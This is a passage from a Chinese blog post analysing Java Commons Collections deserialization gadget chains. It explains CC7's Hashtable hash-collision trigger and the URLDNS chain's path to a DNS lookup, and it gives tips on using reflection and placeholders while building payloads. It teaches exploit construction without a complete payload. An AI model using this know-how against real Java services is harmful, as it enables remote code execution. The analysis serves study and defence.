<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">        ...</div><div class="line">        Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;</div><div class="line">        <span class="keyword">if</span> (m.size() != size())</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            </div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p><strong>3. 该链中的hash碰撞是怎么回事？</strong></p>
<ol type="1">
<li>CC7为什么要构造hash碰撞？</li>
</ol>
<p>还是来看关键触发点，注意到要执行 <code>e.key.equals(key)</code> ，必须确保if语句中的第一个条件 <code>e.hash == hash</code> 为true，也就是说，待新加入的Entry的hash必须要和前面已经加入的元素的hash一致，所以这里需要一个HashTable的hash碰撞：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> StreamCorruptedException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ...</div><div class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></div><div class="line">        <span class="comment">// This should not happen in deserialized version.</span></div><div class="line">        <span class="keyword">int</span> hash = hash(key);</div><div class="line">        <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</div><div class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<span class="comment">//注意这里的条件</span></div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>已知 <code>yy</code> 和 <code>zZ</code> 是一对hash碰撞，那还有没有其他的碰撞呢？</li>
</ol>
<p>在CC7中，获取的是LazyMap这个对象的hash，这个工作是由native代码（ <code>Object.hashCode()</code> ）实现的，</p>
<p><a href="https://github.com/openjdk/jdk/blob/jdk7-b24/jdk/src/share/native/java/lang/Object.c" class="uri" target="_blank" rel="external">https://github.com/openjdk/jdk/blob/jdk7-b24/jdk/src/share/native/java/lang/Object.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> JNINativeMethod methods[] = &#123;</div><div class="line">    &#123;<span class="string">"hashCode"</span>,    <span class="string">"()I"</span>,                    (<span class="keyword">void</span> *)&amp;JVM_IHashCode&#125;,</div><div class="line">    &#123;<span class="string">"wait"</span>,        <span class="string">"(J)V"</span>,                   (<span class="keyword">void</span> *)&amp;JVM_MonitorWait&#125;,</div><div class="line">    &#123;<span class="string">"notify"</span>,      <span class="string">"()V"</span>,                    (<span class="keyword">void</span> *)&amp;JVM_MonitorNotify&#125;,</div><div class="line">    &#123;<span class="string">"notifyAll"</span>,   <span class="string">"()V"</span>,                    (<span class="keyword">void</span> *)&amp;JVM_MonitorNotifyAll&#125;,</div><div class="line">    &#123;<span class="string">"clone"</span>,       <span class="string">"()Ljava/lang/Object;"</span>,   (<span class="keyword">void</span> *)&amp;JVM_Clone&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其具体实现需要跟踪 <code>JVM_IHashCode()</code> 方法，这里不再展开，我们选择猜测和模拟该native。</p>
<p>参考<a href="https://zhuanlan.zhihu.com/p/188736282" target="_blank" rel="external">java中常常提起的hashCode到底是个啥?</a>，我们可以参考String对象中的hashCode方法重写：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span></span></div><div class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>, <span class="title">Comparable</span>&lt;<span class="title">String</span>&gt;, <span class="title">CharSequence</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> h = hash;</div><div class="line">        <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">char</span> val[] = value;</div><div class="line"></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</div><div class="line">                h = <span class="number">31</span> * h + val[i];</div><div class="line">            &#125;</div><div class="line">            hash = h;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> h;</div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先，调试结果得到 <code>yy</code> 和 <code>zZ</code> 对应的LazyMap的hash都是3873。猜测对于LazyMap的hash，直接取了其中的字符串进行相同的操作，然后进行后续计算，我们将以上代码用python模拟一下，输出了3872，少了1：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashCode</span><span class="params">(string)</span>:</span></div><div class="line">    h = <span class="number">0</span></div><div class="line">    </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</div><div class="line">        h = <span class="number">31</span> * h + ord(i)</div><div class="line">        </div><div class="line">    <span class="keyword">return</span> h</div><div class="line"></div><div class="line">print(hashCode(<span class="string">'yy'</span>)) <span class="comment"># 3872</span></div><div class="line">print(hashCode(<span class="string">'zZ'</span>)) <span class="comment"># 3872</span></div></pre></td></tr></table></figure>
<p>但这足以说明String和LazyMap的hash是相关的。所以我们简单的减一下第一位的字母，选择为“yx”和“zY”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashCode</span><span class="params">(string)</span>:</span></div><div class="line">    h = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</div><div class="line">        h = <span class="number">31</span> * h + ord(i)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> h</div><div class="line"></div><div class="line">print(hashCode(<span class="string">'yx'</span>)) <span class="comment"># 3871</span></div><div class="line">print(hashCode(<span class="string">'zY'</span>)) <span class="comment"># 3871</span></div></pre></td></tr></table></figure>
<p>经验证，java中的输出为3870，这里又多了1，但这不影响该漏洞的触发，同样的，这对字符串能成功触发该链。类似的字符串对还有“AaAaAa”和“BBAaBB”等。</p>
<h2 id="urldns">URLDNS</h2>
<p>该链以HashMap的 <code>reaObject()</code> 作为入口，以 <code>putForCreate</code> -&gt; <code>hash</code> -&gt; <code>k.hashCode()</code> 的执行路径执行URL对象的 <code>hashCode()</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></div><div class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></div><div class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">    ...</div><div class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;mappings; i++) &#123;</div><div class="line">            K key = (K) s.readObject();</div><div class="line">            V value = (V) s.readObject();</div><div class="line">            putForCreate(key, value); <span class="comment">//关键点</span></div><div class="line">        &#125;</div><div class="line">    ...</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">putForCreate</span><span class="params">(K key, V value)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> hash = <span class="keyword">null</span> == key ? <span class="number">0</span> : hash(key); <span class="comment">// 关键点</span></div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</div><div class="line">    ...</div><div class="line">        h ^= k.hashCode();<span class="comment">//关键点，调用URL对象的hashCode()</span></div><div class="line">    ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>进而触发URLStreamHandler的 <code>hashCode</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">URL</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</div><div class="line">            <span class="keyword">return</span> hashCode;</div><div class="line"></div><div class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>); <span class="comment">// 关键点</span></div><div class="line">        <span class="keyword">return</span> hashCode;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>URLStreamHandler的hashCode方法会访问相应的host：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public abstract class URLStreamHandler &#123;</div><div class="line">    protected int hashCode(URL u) &#123;</div><div class="line">        int h = 0;</div><div class="line"></div><div class="line">        // Generate the protocol part.</div><div class="line">        String protocol = u.getProtocol();</div><div class="line">        if (protocol != null)</div><div class="line">            h += protocol.hashCode();</div><div class="line"></div><div class="line">        // Generate the host part.</div><div class="line">        InetAddress addr = getHostAddress(u); // 关键点，此方法内部会以http协议访问相应的host地址</div><div class="line">        ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用栈大致为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-&gt;HashMap.readObject()</div><div class="line">-&gt;HashMap.putForCreate()</div><div class="line">-&gt;HashMap.hash()</div><div class="line">    -&gt;URL.hashCode()</div><div class="line">        -&gt;URLStreamHandler.hashCode()</div><div class="line">        -&gt;URLStreamHandler.getHostAddress()</div></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<p>参考一张图（来源<a href="https://theoyu.top/java/deserialize/CommonsCollections" target="_blank" rel="external">Theoyu-CommonsCollections</a>，没找到原出处），可以清楚地看到各链之间的关系，有很多重合的链结：</p>
<p><img src="http://129.204.230.95/img/blogimg/cc/cc.png"></p>
<ol type="1">
<li>为什么要使用反射：
<ol type="1">
<li>在POP链的触发过程中，我们并不能像平时写代码一样直接执行任意的命令，只能通过POP链的一步一步执行来利用，而Transformer的一系列实现让我们能够在POP链执行中通过反射的形式达到执行恶意命令的目的（主要还是因为“链式转化器”只能执行函数，而反射过程只需要能执行函数即可）。</li>
<li>在构造payload时使用反射是因为很多情况下，我们需要用一个“空元素”去占位，否则就会在payload构造阶段就触发payload，导致反序列化利用失败。这一点在调试中经常发生，所以建议能占位就占位，最后再用反射去强行修改对象的成员变量。可以和调试结合来构造，因为过程中涉及很多繁琐的调用操作，静态地看很难找到原因。</li>
</ol></li>
<li>恶意类的字节码加载中，一个类在运行时只会加载一次，如果要再次触发，需要换一个类名。</li>
<li>在理解链时，还要对各种类在实际开发时怎么使用，其设计思想是什么样的进行理解，这样才能理解链中的一些细节。</li>
<li>与POP链的对比：POP链的入口数更少，污点数更多；而Java的入口数更多，污点数反而更少。这是因为Java的语法繁琐性决定的：要找到一个可利用的污点对语法具有较高要求；而PHP往往仅需要一个函数即可触发。所以Java链一般从污点往回找，POP链一般从源往后找。</li>
<li>此外，由于Java的强类型性，与PHP相比，Java的链并没有那么灵活的链间跳转；如果PHP的成员对象也设置上类型限制（PHP新版本已支持类型限制），那么PHP的反序列化链数量将会大大减少。</li>
</ol>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="https://xz.aliyun.com/t/9409" target="_blank" rel="external">CC链 1-7 分析</a></li>
<li><a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html" target="_blank" rel="external">Interface Transformer</a></li>
<li><a href="https://github.com/p1n93r/javasec" target="_blank" rel="external">javasec</a></li>
<li><a href="http://thegreycorner.com/2016/05/01/commoncollections-deserialization.html" target="_blank" rel="external">CommonCollections deserialization attack payloads from ysoserial failing on &gt; JRE 8u72</a></li>
<li><a href="https://www.zhihu.com/question/20794107/answer/658139129" target="_blank" rel="external">Java 动态代理作用是什么？ - bravo1988的回答 - 知乎</a></li>
<li><a href="https://xz.aliyun.com/t/7031" target="_blank" rel="external">JAVA反序列化 - Commons-Collections组件</a></li>
<li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/" target="_blank" rel="external">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></li>
<li><a href="https://theoyu.top/java/deserialize/CommonsCollections" target="_blank" rel="external">Theoyu-CommonsCollections</a></li>
<li><a href="https://www.anquanke.com/post/id/248169" target="_blank" rel="external">CC第7链HashTable触发点深入分析</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/188736282" target="_blank" rel="external">java中常常提起的hashCode到底是个啥?</a></li>
</ul>

        
        </div>
        
        
        
        
<div id="copyright-div">    

    <ul class="post-copyright">
      <li class="post-copyright-author">
          <strong>本文作者：<a href="https://github.com/HACHp1">HACHp1</a> </strong>
      </li>
      <li class="post-copyright-link">
        <strong>本文链接：</strong>
        <a href="/posts/Web安全/20220407-cc_analysis.html" title="Commons Collections链分析">https://hachp1.github.io/posts/Web安全/20220407-cc_analysis.html</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明： </strong>
        本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。非商业转载请注明作者及出处。商业转载请联系作者本人。
      </li>
    </ul>
 
</div>


        
        
        
        <footer class="article-footer">
            <div class="share-container">



    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
<a class="a2a_button_wechat"></a>
<a class="a2a_button_qzone"></a>
<a class="a2a_button_sina_weibo"></a>
<a class="a2a_button_twitter"></a>
<a class="a2a_button_facebook"></a>
<a class="a2a_button_telegram"></a>
</div>
<script async src="https://static.addtoany.com/menu/page.js"></script>

<script type="text/javascript" src="//static.addtoany.com/menu/page.js"></script>
<style>
    .a2a_menu {
        border-radius: 4px;
    }
    .a2a_menu a {
        margin: 2px 0;
        font-size: 14px;
        line-height: 16px;
        border-radius: 4px;
        color: inherit !important;
        font-family: 'Microsoft Yahei';
    }
    #a2apage_dropdown {
        margin: 10px 0;
    }
    .a2a_mini_services {
        padding: 10px;
    }
    a.a2a_i,
    i.a2a_i {
        width: 122px;
        line-height: 16px;
    }
    a.a2a_i .a2a_svg,
    a.a2a_more .a2a_svg {
        width: 16px;
        height: 16px;
        line-height: 16px;
        vertical-align: top;
        background-size: 16px;
    }
    a.a2a_i {
        border: none !important;
    }
    a.a2a_menu_show_more_less {
        margin: 0;
        padding: 10px 0;
        line-height: 16px;
    }
    .a2a_mini_services:after{content:".";display:block;height:0;clear:both;visibility:hidden}
    .a2a_mini_services{*+height:1%;}
</style>

</div>


            
    

        </footer>
    </div>
    
        
<nav id="article-nav">
    
        <a href="/posts/Web安全/20220414-spring4shell.html" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">上一篇</strong>
            <div class="article-nav-title">
                
                    Spring4Shell简析（CVE-2022-22965）
                
            </div>
        </a>
    
    
        <a href="/posts/Web安全/20220325-fastjson.html" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">下一篇</strong>
            <div class="article-nav-title">Fastjson 1.2.24反序列化漏洞浅析</div>
        </a>
    
</nav>


    
    
    
</article>


    
    
        <section id="comments">
    <div id="valine-thread"></div>
</section>
    

</section>
            
                
<aside id="sidebar">
   
        
    <div class="widget-wrap">
        <h3 class="widget-title">最新文章</h3>
        <div class="widget">
            <ul id="recent-post" class="">
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/杂文/20250128-thinking4.html" class="thumbnail">
    
    
        <span style="background-image:url(http://129.204.230.95/img/thumbnails/cat.jpg)" alt="点绛唇·乙巳蛇年有寄" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/杂文/">杂文</a></p>
                            <p class="item-title"><a href="/posts/杂文/20250128-thinking4.html" class="title">点绛唇·乙巳蛇年有寄</a></p>
                            <p class="item-date"><time datetime="2025-01-28T14:33:41.000Z" itemprop="datePublished">2025-01-28</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/杂文/20250128-thinking3.html" class="thumbnail">
    
    
        <span style="background-image:url(http://129.204.230.95/img/thumbnails/cat.jpg)" alt="点绛唇·乙巳除夕独念" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/杂文/">杂文</a></p>
                            <p class="item-title"><a href="/posts/杂文/20250128-thinking3.html" class="title">点绛唇·乙巳除夕独念</a></p>
                            <p class="item-date"><time datetime="2025-01-28T14:18:33.000Z" itemprop="datePublished">2025-01-28</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/杂文/20240210-thinking2.html" class="thumbnail">
    
    
        <span style="background-image:url(http://129.204.230.95/img/thumbnails/cat.jpg)" alt="江城子 甲辰随想" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/杂文/">杂文</a></p>
                            <p class="item-title"><a href="/posts/杂文/20240210-thinking2.html" class="title">江城子 甲辰随想</a></p>
                            <p class="item-date"><time datetime="2024-02-10T10:22:11.000Z" itemprop="datePublished">2024-02-10</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/静态分析/20220723-graph-sa-1.html" class="thumbnail">
    
    
        <span style="background-image:url(http://129.204.230.95/img/thumbnails/planet_red.png)" alt="基于图数据库的静态分析技术初探（一）" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/静态分析/">静态分析</a></p>
                            <p class="item-title"><a href="/posts/静态分析/20220723-graph-sa-1.html" class="title">基于图数据库的静态分析技术初探（一）</a></p>
                            <p class="item-date"><time datetime="2022-07-23T15:07:01.000Z" itemprop="datePublished">2022-07-23</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/Web安全/20220414-spring4shell.html" class="thumbnail">
    
    
        <span style="background-image:url(http://129.204.230.95/img/thumbnails/eggs.jpg)" alt="Spring4Shell简析（CVE-2022-22965）" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
                            <p class="item-title"><a href="/posts/Web安全/20220414-spring4shell.html" class="title">Spring4Shell简析（CVE-2022-22965）</a></p>
                            <p class="item-date"><time datetime="2022-04-14T13:44:06.000Z" itemprop="datePublished">2022-04-14</time></p>
                        </div>
                    </li>
                
            </ul>
        </div>
    </div>

    
        
    <div class="widget-wrap">
        <h3 class="widget-title">标签</h3>
        <div class="widget">
            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">18</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/静态分析/">静态分析</a><span class="tag-list-count">1</span></li></ul>
        </div>
    </div>

    
        
    <div class="widget-wrap">
        <h3 class="widget-title">标签云</h3>
        <div class="widget tagcloud">
            <a href="/tags/Linux日常/" style="font-size: 11.43px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/对抗样本/" style="font-size: 10px;">对抗样本</a> <a href="/tags/心情随笔/" style="font-size: 14.29px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 18.57px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 15.71px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 12.86px;">机器学习初步</a> <a href="/tags/漏洞分析/" style="font-size: 17.14px;">漏洞分析</a> <a href="/tags/静态分析/" style="font-size: 10px;">静态分析</a>
        </div>
    </div>

    
        
    <div class="widget-wrap widget-list">
        <h3 class="widget-title">链接</h3>
        <div class="widget">
            <ul>
                
                    <li>
                        <a href="https://hpasserby.top/">Hpasserby</a>
                    </li>
                
                    <li>
                        <a href="https://redogwu.github.io">redogWu</a>
                    </li>
                
                    <li>
                        <a href="https://xi4or0uji.github.io/">Xi4or0uji</a>
                    </li>
                
                    <li>
                        <a href="https://mzgao.blog.csdn.net/">mzgao</a>
                    </li>
                
            </ul>
        </div>
    </div>


    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>

            
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            &copy; 2025 HACHp1<br>
            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
        </div>
    </div>
</footer>
        
    
    <script src="//unpkg.com/leancloud-storage@3.15.0/dist/av-min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js"></script>
    <script>
        new Valine({
            el: '#valine-thread' ,
            notify:true,
            verify:true,
            app_id: 'GpqOpUBld8udMg3PSOCDbYr7-gzGzoHsz',
            app_key: 'k6nxcdbcy4MrjOq2DssFFljB',
            placeholder: '少侠，留下几句话，我们喝一壶啊 ヾﾉ≧∀≦)o （支持markdown语句，可插入图片）'
        });
    </script>




    
        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
    
    
    
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
        </script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
    



<!-- Custom Scripts -->
<script src="/js/main.js"></script>

    </div>
</body>
</html>